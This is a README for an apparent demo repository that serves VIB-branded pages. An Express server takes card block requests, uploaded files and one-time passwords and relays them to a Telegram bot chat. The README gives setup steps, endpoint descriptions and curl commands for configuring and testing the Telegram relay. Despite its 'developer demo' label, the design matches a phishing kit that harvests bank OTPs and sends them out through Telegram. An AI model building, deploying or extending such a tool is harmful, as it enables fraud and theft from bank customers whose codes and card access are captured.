# VIB Demo: Relay card block requests + OTP to Telegram

This repository contains small frontend pages and a demo Express server that accepts card block/hủy requests and OTPs, and forwards them to a Telegram bot chat. It's intended as a developer demo; do NOT use in production without proper security reviews.

Quick start

1. Copy `.env.example` to `.env` and fill in values:

```powershell
cp .env.example .env
# then edit .env to add your TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID
```

2. Install dependencies and run server

```powershell
npm install
npm run start
```

3. The server will listen on the port from `.env` (default `3000`).

Endpoints

- `POST /api/request-block` — accepts form fields and optional file uploads (multipart/form-data). Returns `{ status: 'ok', requestId, maskedPhone }`.
- `POST /api/verify-otp` — accepts JSON `{ requestId, otp }` and returns `{ status: 'verified' }` on success.

Security & notes

- This server stores request data in-memory (Map) for demo only.
- The Telegram bot token is required and must be kept secret. Do not commit it to git.
- For production, validate inputs, store files securely, rate-limit, and use proper authentication.

## Telegram bot setup (dev)

You can configure the Telegram bot token and chat id either via `.env` or at runtime using dev-only endpoints.

1) Environment variables (preferred for persistence):

```
TELEGRAM_BOT_TOKEN=123456:ABC...your-bot-token
TELEGRAM_CHAT_ID=123456789
PORT=4000
HOST=127.0.0.1
```

2) Runtime configuration (not persisted; dev-only):

- Check current status (masked token):

```
curl http://127.0.0.1:4000/api/telegram/status
```

- Set token and chat id (and verify with getMe):

```
curl -H "Content-Type: application/json" \
	--data '{"token":"123456:ABC...","chatId":"123456789","verify":true}' \
	http://127.0.0.1:4000/api/telegram/config
```

- Test sending a message:

```
curl -H "Content-Type: application/json" \
	--data '{"text":"Hello from local server"}' \
	http://127.0.0.1:4000/api/telegram/test
```

Notes:
- These endpoints are disabled when `NODE_ENV=production`.
- The server uses the in-memory config set by `.env` or `/api/telegram/config` for all Telegram notifications.
